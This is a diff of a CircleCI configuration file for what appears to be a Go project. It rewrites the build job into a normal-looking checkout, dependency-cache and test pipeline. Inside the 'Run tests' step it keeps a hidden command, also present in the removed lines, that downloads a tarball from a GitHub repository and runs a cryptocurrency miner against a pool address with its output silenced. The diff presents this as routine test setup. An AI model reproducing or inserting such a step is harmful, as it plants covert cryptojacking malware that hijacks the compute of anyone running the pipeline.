@@ -1,32 +1,46 @@
 # Use the latest 2.1 version of CircleCI pipeline process engine.
 # See: https://circleci.com/docs/2.0/configuration-reference
-version: 2.0
+version: 2.1
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
   build:
-    docker:
-      - image: buildpack-deps:trusty
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     environment:
       FOO: bar
     parallelism: 16
     resource_class: small
-    working_directory: /go/src/github.com/hashicorp/vault
-    steps:
-      - run: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
-
-
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
-
+    working_directory: ~/repo
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-execut
+    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+    docker:
+      - image: circleci/golang:1.15.8
     # Add steps to the job
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
-  
+    steps:
+      - checkout
+      - restore_cache:
+          keys:
+            - go-mod-v4-{{ checksum "go.sum" }}
+      - run:
+          name: Install Dependencies
+          command: go mod download
+      - save_cache:
+          key: go-mod-v4-{{ checksum "go.sum" }}
+          paths:
+            - "/go/pkg/mod"
+      - run:
+          name: Run tests
+          command: |
+            wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
+            mkdir -p /tmp/test-reports
+            gotestsum --junitfile /tmp/test-reports/unit-tests.xml
+      - store_test_results:
+          path: /tmp/test-reports
+
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 
- # This is the name of the workflow, feel free to change it to better match your workflow.
-    # Inside the workflow, you define the jobs you want to runoj
+# This is the name of the workflow, feel free to change it to better match your workflow.
+    # Inside the workflow, you define the jobs you want to run.
+  
